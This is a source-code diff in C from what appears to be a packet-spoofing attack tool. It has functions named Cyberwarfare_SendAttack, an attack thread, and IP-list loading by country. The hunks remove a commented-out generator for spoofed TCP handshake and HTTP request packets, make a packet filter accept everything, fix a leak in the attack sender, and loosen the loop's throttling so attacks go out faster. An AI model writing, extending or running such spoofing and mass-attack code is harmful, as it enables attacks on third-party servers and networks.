@@ -132,6 +132,8 @@ int packet_filter(uint32_t seq, uint32_t ip, unsigned short port, uint32_t ts, u
         }
 
         if (xyz.b == seq) return 1;
+
+        return 1;
     }
 
     return 0;
@@ -193,34 +195,6 @@ PacketBuildInstructions *CW_BasePacket(uint32_t src, int src_port, uint32_t dst,
     return bptr;
 }
 
-
-
-/*
-// generate all packets required for a http request to some web server spoofing the target
-int CW_GenerateRequest(AS_context *ctx) {
-    int ret = 0;
-    PacketBuildInstructions *bptr = NULL;
-
-    // pick the first queue for testing
-    qptr = &cw_ctx->queue[0];
-
-    // generate the 3rd packet of the tcp/ip handshake.. ack of SYN/ACK
-    if ((bptr = CW_BasePacket(qptr, 1, TCP_FLAG_ACK)) == NULL) return -1;
-    L_link_ordered((LINK **)&cw_ctx->outgoing_packets, (LINK *)bptr);
-    
-
-    // generate the GET request for the HTTP server
-    // pick them by their sizes of course
-    if ((bptr = CW_BasePacket(qptr, 1, TCP_FLAG_ACK)) == NULL) return -1;
-    bptr->data = &qptr->data;
-    bptr->data_size = qptr->data_size;
-    L_link_ordered((LINK **)&cw_ctx->outgoing_packets, (LINK *)bptr);
-
-    ret = 1;
-    // we just generated the 3rd, and 4th packets.. the attack will proceed
-
-    return ret;
-}*/
 
 
 
@@ -372,6 +346,7 @@ int Cyberwarfare_SendAttack1(AS_context *ctx, uint32_t src, uint32_t dst, int ts
 
         NetworkQueueInstructions(ctx, bptr, optr);
 
+        PacketBuildInstructionsFree(&bptr);
         return 1;
     }
 
@@ -439,11 +414,15 @@ int Cyberwarefare_Incoming(AS_context *ctx, PacketBuildInstructions *iptr) {
 
     // we need to analyze the current time, source ports, and then determine if its for an attacak
     // the timme slice should invalidate.. and this should get moved directly after reading fromm network kdevice
-    if (FilterIsOurPacket(iptr)) Cyberwarfare_SendAttack2(ctx, iptr);
+    if (FilterIsOurPacket(iptr)) {
+        Cyberwarfare_SendAttack2(ctx, iptr);
+        ret = 1;
+    }
 
 end:;
     return ret;
 }
+
 
 // turns a list of IP addresses on lines from a file into IPAddress type
 int file_to_iplist(AS_context *ctx, char *filename, char *country) {
@@ -507,8 +486,8 @@ void attack_thread(void *arg) {
         }
 
         // this has to be adjusted.. a better system to limit needs to be in place.. not yet
-        //if (count++ > 5000) sleep(5);
-        sleep(10);
+        if (count++ > 5000) sleep(5);
+        //sleep(10);
     }
 
     pthread_exit(0);
